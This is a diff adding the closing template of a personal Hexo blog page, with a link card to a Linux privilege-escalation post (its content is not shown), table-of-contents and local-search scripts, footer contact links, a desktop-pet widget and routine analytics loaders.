+                <a class="home-title-link" href="/2026/10/31/Linux%E6%8F%90%E6%9D%83%E6%9D%82%E7%AF%87/" aria-label="阅读：linux提权-杂篇">
+                    <h2>linux提权-杂篇</h2>
+                </a>
+                
+                <div class="compact-card-tags" aria-label="文章标签">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/" class="compact-card-tag">#内网</a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/" class="compact-card-tag">#红队</a>
+                    
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank" rel="noopener noreferrer">wuk0Ng</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener noreferrer">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color">加载中…</span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color">加载中…</span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/web-wuk0Ng" class="tooltipped" target="_blank" rel="noopener noreferrer" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:3134985131@qq.com" class="tooltipped" target="_blank" rel="noopener noreferrer" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3442584626" class="tooltipped" target="_blank" rel="noopener noreferrer" data-tooltip="QQ联系我: 3442584626" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" rel="noopener noreferrer" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" maxlength="80" autocomplete="off">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                var escapeHtml = function (value) {
+                    return String(value).replace(/[&<>"']/g, function (character) {
+                        return {
+                            '&': '&amp;',
+                            '<': '&lt;',
+                            '>': '&gt;',
+                            '"': '&quot;',
+                            "'": '&#39;'
+                        }[character];
+                    });
+                };
+                var escapeRegExp = function (value) {
+                    return String(value).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+                };
+                var toLocalUrl = function (value) {
+                    try {
+                        var parsedUrl = new URL(value, window.location.origin);
+                        if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
+                            return '#';
+                        }
+                        return parsedUrl.pathname + parsedUrl.search + parsedUrl.hash;
+                    } catch (error) {
+                        return '#';
+                    }
+                };
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/).filter(Boolean).slice(0, 10);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = toLocalUrl(data.url);
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + escapeHtml(data_url) + "' class='search-result-title'>" + escapeHtml(data.title.trim()) + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = escapeHtml(content.substr(start, end));
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var safeKeyword = escapeHtml(keyword);
+                                    var regS = new RegExp(escapeRegExp(safeKeyword), "gi");
+                                    match_content = match_content.replace(regS, function (match) {
+                                        return "<em class=\"search-keyword\">" + match + "</em>";
+                                    });
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    <aside id="linDesktopPet" class="lin-desktop-pet" aria-label="林翩翩桌宠">
+    <div class="lin-pet-bubble" role="status" aria-live="polite">这儿……便是你的住处？</div>
+    <div class="lin-pet-effects" aria-hidden="true"></div>
+    <button class="lin-pet-character" type="button" aria-label="和林翩翩互动" title="点击互动，也可以拖动">
+        <img src="/medias/lin-pianpian/official-desktop-pet.webp" alt="林翩翩桌宠" width="576" height="703" loading="lazy" decoding="async" fetchpriority="low">
+    </button>
+</aside>
+
+<script src="/js/desktop-pet.js?v=20261031-safety50" defer fetchpriority="low"></script>
+
+
+    <script src="/libs/materialize/materialize.min.js" defer fetchpriority="low"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js" defer fetchpriority="low"></script>
+    <script src="/libs/aos/aos.js" defer fetchpriority="low"></script>
+    
+    <script src="/libs/scrollprogress/scrollProgress.min.js" defer fetchpriority="low"></script>
+    
+    
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js" defer fetchpriority="low"></script>
+    
+    <script src="/js/matery.js?v=20260824-speed1" defer fetchpriority="low"></script>
+
+    <!-- Baidu Analytics -->
+
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        if (/^(localhost|127\.0\.0\.1)$/.test(window.location.hostname)) return;
+
+        function loadBaiduPush() {
+            var bp = document.createElement('script');
+            bp.async = true;
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            document.head.appendChild(bp);
+        }
+
+        if ('requestIdleCallback' in window) {
+            window.requestIdleCallback(loadBaiduPush, { timeout: 4500 });
+        } else {
+            window.addEventListener('load', function () {
+                window.setTimeout(loadBaiduPush, 1800);
+            }, { once: true });
+        }
+    })();
+</script>
+
+
+    
+    <script src="/libs/others/clicklove.js" async></script>
+    
+    
+    <script src="/libs/others/busuanzi.pure.mini.js?v=20261026-stats1" async></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
